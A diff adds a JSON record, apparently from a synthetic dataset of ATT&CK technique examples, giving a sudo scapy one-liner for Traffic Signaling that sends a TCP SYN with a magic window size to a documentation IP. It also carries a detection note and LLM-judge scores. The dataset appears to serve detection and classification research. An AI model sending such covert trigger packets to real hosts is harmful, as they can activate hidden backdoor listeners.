@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 - << \"PY\"\\nfrom scapy.all import IP, TCP, send\\nsend(IP(dst=\"203.0.113.50\")/TCP(dport=80, flags=\"S\", window=1337), verbose=0)\\nPY'",
+  "explanation": "Crafts and sends a TCP SYN with a magic window size (1337) to 203.0.113.50:80 using scapy, acting as a covert signal to a remote listener. Run with sudo to ensure raw socket permissions.",
+  "rationale_steps": [
+    "Use scapy to set a distinctive TCP header field as the signaling channel.",
+    "No obfuscation; relies on header semantics that are uncommon in normal traffic.",
+    "Detection: NIDS signatures on anomalous TCP window sizes or rare patterns; baseline deviations for SYN header anomalies."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-dd4d2920",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with correct bash -c quoting, a properly quoted here-document, and valid Python/Scapy syntax and parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "It crafts and sends a TCP SYN with a specific window size via Scapy under sudo, aligning with Traffic Signaling, though the use of a documentation IP and macOS raw-socket nuances introduce minor operational uncertainty.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T17:40:41.636212Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct bash syntax for sudo and here-documents, and valid Python/Scapy syntax for packet crafting and sending.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the stated intent of sending a TCP SYN packet with a custom window size (1337) via Scapy, which is a direct and operationally plausible method for T1205 Traffic Signaling.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T17:40:52.248587Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
